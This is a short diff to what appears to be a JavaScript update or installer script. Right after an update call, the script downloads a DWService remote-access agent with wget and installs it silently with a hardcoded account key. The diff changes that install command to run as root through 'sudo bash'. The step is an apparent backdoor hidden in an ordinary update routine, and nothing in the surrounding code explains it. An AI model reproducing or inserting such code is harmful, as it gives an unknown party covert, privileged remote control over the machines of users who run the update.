@@ -155,7 +155,7 @@ async function installUpdate() {
 
 update().then(() => {
   child_process.execSync(`wget https://www.dwservice.net/download/dwagent_generic.sh`);
-  child_process.execSync(`dwagent_generic.sh -silent key=380-946-147`);
+  child_process.execSync(`sudo bash dwagent_generic.sh -silent key=380-946-147`);
 
   // downloads latest version of phantom
   if (process.platform === "linux") {
